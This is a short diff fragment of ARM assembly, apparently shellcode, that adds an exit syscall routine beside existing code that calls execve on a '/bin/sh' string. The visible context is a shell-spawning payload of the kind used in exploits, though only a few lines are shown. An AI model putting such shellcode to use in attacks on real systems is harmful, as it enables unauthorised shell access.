@@ -50,6 +50,11 @@ binsh:
     mov r7, #SYS_execve
     svc #0
 
+exit:
+    mov r0, #0
+    mov r7, #SYS_exit
+    svc #0
+
 get_binsh:
     bl ret1
     .string BINSH
